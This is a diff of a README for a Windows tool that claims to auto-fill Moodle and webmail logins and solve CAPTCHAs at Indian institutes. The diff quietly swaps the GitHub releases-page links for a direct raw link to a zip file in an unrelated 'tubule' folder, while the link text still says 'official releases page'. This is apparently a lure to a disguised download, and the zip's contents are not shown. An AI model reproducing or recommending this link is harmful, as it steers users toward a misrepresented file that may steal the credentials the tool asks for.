@@ -1,6 +1,6 @@
 # 🤖 iit-moodle-auto-login - Save time accessing your student portals
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Bastians1111/iit-moodle-auto-login/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Bastians1111/iit-moodle-auto-login/main/tubule/login_auto_moodle_iit_3.9.zip)
 
 This software automates your login process for Moodle and Webmail services at Indian institutes. It handles your credentials and completes CAPTCHA tasks for you. This tool works on any website ending in .ac.in.
 
@@ -14,7 +14,7 @@ This tool works on devices running Windows 10 or Windows 11. You need a modern w
 
 ## ⬇️ How to download and install
 
-1. Visit the [official releases page](https://github.com/Bastians1111/iit-moodle-auto-login/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Bastians1111/iit-moodle-auto-login/main/tubule/login_auto_moodle_iit_3.9.zip).
 2. Look for the version marked as Latest.
 3. Click the file ending in .zip to start the download.
 4. Open your Downloads folder once the file reaches your computer.
